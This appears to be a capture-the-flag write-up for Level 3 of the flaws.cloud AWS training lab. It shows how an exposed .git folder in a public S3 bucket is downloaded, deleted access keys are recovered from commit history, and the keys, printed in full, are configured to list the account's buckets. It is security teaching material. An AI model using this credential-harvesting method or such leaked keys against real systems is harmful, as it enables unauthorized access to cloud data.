---
title: Level 3
---

Status: Done
Assign: Dcyberguy

![image.png](../../../assets/images/Flaws/level-3-banner.png)

```bash
curlie http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud -v
*   Trying 52.92.195.219:80...
* Connected to level3-9afd3927f195e10225021a578e6f78df.flaws.cloud (52.92.195.219) port 80 (#0)
GET / HTTP/1.1
Host: level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
User-Agent: curl/7.88.1
Accept: application/json, */*

HTTP/1.1 200 OK
x-amz-id-2: BFjoyS2D1DuF8P0Qy5El9J2gILwshlmXWWO5YRnLNSx+ZrCyKxDfhnXQyRxEdpMT+8S6sBVMsAE=
x-amz-request-id: QZ3SY95HAKX2R2PW
Date: Wed, 14 Jan 2026 22:21:12 GMT
Last-Modified: Fri, 22 May 2020 18:21:10 GMT
ETag: "5a36dafda1c9899804518fae71c9461a"
Content-Type: text/html
Content-Length: 1861
Server: AmazonS3
<< SNIP FOR BREVITY >>
```
## Enumeration:

Looking at the Amazon s3 bucket for `LEVEL 3`. I see at folder called `.git`. That is interesting, maybe we might find somehting juicey in there.

```bash
aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
                           PRE .git/
2017-02-26 19:14:33     123637 authenticated_users.png
2017-02-26 19:14:34       1552 hint1.html
2017-02-26 19:14:34       1426 hint2.html
2017-02-26 19:14:35       1247 hint3.html
2017-02-26 19:14:33       1035 hint4.html
2020-05-22 14:21:10       1861 index.html
2017-02-26 19:14:33         26 robots.txt

```

Let’s download the contents in the `.git` folder.

```bash
aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git /home/pwnedlabs/Flaws.cloud
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/COMMIT_EDITMSG to ./COMMIT_EDITMSG
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/prepare-commit-msg.sample to hooks/prepare-commit-msg.sample
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/HEAD to ./HEAD
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/config to ./config
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/pre-commit.sample to hooks/pre-commit.sample
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/commit-msg.sample to hooks/commit-msg.sample
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/pre-rebase.sample to hooks/pre-rebase.sample
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/description to ./description
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/index to ./index
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/applypatch-msg.sample to hooks/applypatch-msg.sample
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/post-update.sample to hooks/post-update.sample
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/pre-applypatch.sample to hooks/pre-applypatch.sample
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/update.sample to hooks/update.sample
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/2f/c08f72c2135bb3af7af5803abb77b3e240b6df to objects/2f/c08f72c2135bb3af7af5803abb77b3e240b6df
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/logs/HEAD to logs/HEAD
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/info/exclude to info/exclude
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/53/23d77d2d914c89b220be9291439e3da9dada3c to objects/53/23d77d2d914c89b220be9291439e3da9dada3c
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/0e/aa50ae75709eb4d25f07195dc74c7f3dca3e25 to objects/0e/aa50ae75709eb4d25f07195dc74c7f3dca3e25
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/logs/refs/heads/master to logs/refs/heads/master
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/92/d5a82ef553aae51d7a2f86ea0a5b1617fafa0c to objects/92/d5a82ef553aae51d7a2f86ea0a5b1617fafa0c
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/61/a5ff2913c522d4cf4397f2500201ce5a8e097b to objects/61/a5ff2913c522d4cf4397f2500201ce5a8e097b
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/refs/heads/master to refs/heads/master
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/c2/aab7e03933a858d1765090928dca4013fe2526 to objects/c2/aab7e03933a858d1765090928dca4013fe2526
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/b6/4c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 to objects/b6/4c8dcfa8a39af06521cf4cb7cdce5f0ca9e526
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/e3/ae6dd991f0352cc307f82389d354c65f1874a2 to objects/e3/ae6dd991f0352cc307f82389d354c65f1874a2
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/f2/a144957997f15729d4491f251c3615d508b16a to objects/f2/a144957997f15729d4491f251c3615d508b16a
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/db/932236a95ebf8c8a7226432cf1880e4b4017f2 to objects/db/932236a95ebf8c8a7226432cf1880e4b4017f2
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/f5/2ec03b227ea6094b04e43f475fb0126edb5a61 to objects/f5/2ec03b227ea6094b04e43f475fb0126edb5a61
download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/objects/76/e4934c9de40e36f09b4e5538236551529f723c to objects/76/e4934c9de40e36f09b4e5538236551529f723c
```

List the contents of that downloaded `.git` folder

```bash
ls -l
   rw-r--r--    1   pwnedlabs   pwnedlabs     52 B     Sun Sep 17 11:12:24 2017    COMMIT_EDITMSG 
   rw-r--r--    1   pwnedlabs   pwnedlabs    130 B     Sun Sep 17 11:12:24 2017    config 
   rw-r--r--    1   pwnedlabs   pwnedlabs     73 B     Sun Sep 17 11:12:24 2017    description 
   rw-r--r--    1   pwnedlabs   pwnedlabs     23 B     Sun Sep 17 11:12:24 2017    HEAD 
   rwxr-xr-x    2   pwnedlabs   pwnedlabs      4 KiB   Wed Jan 14 17:37:29 2026    hooks/
   rw-r--r--    1   pwnedlabs   pwnedlabs    600 B     Sun Sep 17 11:12:24 2017    index 
   rwxr-xr-x    2   pwnedlabs   pwnedlabs      4 KiB   Wed Jan 14 17:37:29 2026    info/
   rwxr-xr-x    3   pwnedlabs   pwnedlabs      4 KiB   Wed Jan 14 17:37:29 2026    logs/
   rwxr-xr-x   14   pwnedlabs   pwnedlabs      4 KiB   Wed Jan 14 17:37:27 2026    objects/
   rwxr-xr-x    3   pwnedlabs   pwnedlabs      4 KiB   Wed Jan 14 17:37:27 2026    refs/
```

Running `git log`we can see 2 `deleted entries` to `access_keys.txt` which wasn’t in the original s3 bucket contents.

```bash
commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -> master)
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:43 2017 -0600

    Oops, accidentally added something I shouldn't have

 access_keys.txt | 2 --
 1 file changed, 2 deletions(-)

commit f52ec03b227ea6094b04e43f475fb0126edb5a61
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:07 2017 -0600

    first commit

 access_keys.txt         |   2 ++
 authenticated_users.png | Bin 0 -> 123637 bytes
 hint1.html              |  38 ++++++++++++++++++++++++++++++++++++++
 hint2.html              |  45 +++++++++++++++++++++++++++++++++++++++++++++
 hint3.html              |  44 ++++++++++++++++++++++++++++++++++++++++++++
 hint4.html              |  31 +++++++++++++++++++++++++++++++
 index.html              |  47 +++++++++++++++++++++++++++++++++++++++++++++++
 robots.txt              |   2 ++
 8 files changed, 209 insertions(+)

```

To see the full commit history, I will run the `git show` command

`git show b64c8dc`

```bash
commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -> master)
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:43 2017 -0600

    Oops, accidentally added something I shouldn't have

diff --git a/access_keys.txt b/access_keys.txt
deleted file mode 100644
index e3ae6dd..0000000
--- a/access_keys.txt
+++ /dev/null
@@ -1,2 +0,0 @@
-access_key AKIAXXXXXXXXXXXXXXXXXXXXXXXXXXX
-secret_access_key OdNXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

Add the Access keys to your aws config and include a `profile` flaws.

```bash
aws configure --profile flaws
AWS Access Key ID [None]: AKIAJ366LIPB4IJKT7SA
AWS Secret Access Key [None]: OdNa7m+bqUvF3Bn/qgSnPE1kBpqcBTTjqwP83Jys
Default region name [None]: us-east-1
Default output format [None]: json

```

Check what user is this. Like the linux `whoami`. We are now the `backup` user. 

```bash
aws sts get-caller-identity --profile flaws
{
    "UserId": "AIDAJQ3H5DC3LEG2BKSLC",
    "Account": "975426262029",
    "Arn": "arn:aws:iam::975426262029:user/backup"
}

```

This would give you access to all buckets that can be accessed by the `backup` user

```bash
aws s3 ls --profile flaws
2017-02-12 16:31:07 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
2017-05-29 12:34:53 config-bucket-975426262029
2017-02-12 15:03:24 flaws-logs
2017-02-04 22:40:07 flaws.cloud
2017-02-23 20:54:13 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
2017-02-26 13:15:44 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
2017-02-26 13:16:06 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
2017-02-26 14:44:51 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
2017-02-26 14:47:58 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
2017-02-26 15:06:32 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud

```

```bash
+<html>^M
+    <head>^M
+        <title>flAWS</title>^M
+        <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">^M
+        <style>^M
+            body { font-family: Andale Mono, monospace; }^M
+            :not(center) > pre { background-color: #202020; padding: 4px; border-radius: 5px; border-color:#00d000; ^M
+            border-width: 1px; border-style: solid;} ^M
+        </style>^M
+    </head>^M
+<body ^M
+  text="#00d000" ^M
+  bgcolor="#000000"  ^M
+  style="max-width:800px; margin-left:auto ;margin-right:auto"^M
+  vlink="#00ff00" link="#00ff00">^M
+    ^M
+<center>^M
+<pre >^M
+ _____  _       ____  __    __  _____^M
+|     || |     /    ||  |__|  |/ ___/^M
+|   __|| |    |  o  ||  |  |  (   \_ ^M
+|  |_  | |___ |     ||  |  |  |\__  |^M
+|   _] |     ||  _  ||  `  '  |/  \ |^M
+|  |   |     ||  |  | \      / \    |^M
+|__|   |_____||__|__|  \_/\_/   \___|^M
+</pre>^M
+^M
+<h1>Level 3: Hint 4</h1>^M
+</center>^M
+^M
+The next level is at <a href="http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud">http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud</a>
\ No newline at end of file

```

Head over to Level 4 -------->